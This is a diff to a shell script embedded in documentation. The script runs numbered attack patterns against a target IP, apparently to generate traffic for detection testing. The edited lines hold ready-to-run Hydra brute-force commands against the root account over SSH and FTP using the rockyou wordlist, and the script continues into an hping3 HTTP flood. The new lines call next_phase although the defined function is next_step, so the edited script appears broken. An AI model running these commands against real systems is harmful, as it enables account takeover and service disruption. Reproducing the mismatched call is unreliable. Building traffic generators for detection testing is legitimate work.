@@ -173,7 +173,7 @@ Use one scan per 30-second window.
   # Configuration
   TARGET_IP="192.168.1.X"  # <--- Change this
   USER_LIST="/usr/share/wordlists/metasploit/common_users.txt"
-  PASS_LIST="/usr/share/wordlists/metasploit/common_passwords.txt"
+  PASS_LIST="/usr/share/wordlists/rockyou.txt"
 
   function next_step() {
       echo -e "\n\e[33m[!] Press [ENTER] to execute the next pattern...\e[0m"
@@ -208,14 +208,16 @@ Use one scan per 30-second window.
   next_step
 
   # 6. SSH_BRUTEFORCE_PATTERN
-  echo "Running: SSH_BRUTEFORCE (Hydra)"
-  hydra -L $USER_LIST -P $PASS_LIST $TARGET_IP ssh
-  next_step
+  echo "[+] 6/9: SSH_BRUTEFORCE_PATTERN"
+  # Using -l (lowercase L) for a single username "root" to ensure it starts
+  # Using -P for the password list
+  hydra -l root -P $PASS_LIST ssh://$TARGET_IP -t 4 -vV
+  next_phase
 
   # 7. FTP_BRUTEFORCE_PATTERN
-  echo "Running: FTP_BRUTEFORCE (Hydra)"
-  hydra -L $USER_LIST -P $PASS_LIST $TARGET_IP ftp
-  next_step
+  echo "[+] 7/9: FTP_BRUTEFORCE_PATTERN"
+  hydra -l root -P $PASS_LIST ftp://$TARGET_IP -t 4 -vV
+  next_phase
 
   # 8. HTTP_FLOOD_PATTERN
   echo "Running: HTTP_FLOOD (hping3)"
